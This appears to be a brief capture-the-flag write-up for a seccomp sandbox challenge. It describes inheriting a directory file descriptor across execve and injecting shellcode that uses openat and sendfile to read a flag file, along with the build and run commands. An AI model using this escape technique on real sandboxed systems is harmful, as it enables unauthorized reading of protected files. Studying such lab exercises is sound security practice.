In this problem, you are allowed to use the following system calls instead of `fchdir`.
1. Allowing syscall: openat (number 257)
2. Allowing syscall: read (number 0)
3. Allowing syscall: write (number 1)
4. Allowing syscall: sendfile (number 40)

The different thing is that now the program does not open a file given by the `argv[1]`.
Thus, we cannot get the file descriptor for the top-level directory.

To solve this problem, we can open the top-level directory by ourselves and use it for `openat`.
To do that, I have created a simple C program that opens the top-level directory and `execve` the challenge program.
Then, the file descriptor remains in the challenge program and we can exploit it.

Use the following code to solve this problem.
```
openat(3, "./flag", 0);
sendfile(1, 4, 0, 0x80);
```

Running the following commands will lead you to the flag.
```
gcc main.c
gcc -nostdlib -static shellcode.s -o shellcode-elf​
objcopy --dump-section .text=shellcode-raw shellcode-elf​
/home/ctf/a.out < ~/shellcode-raw
```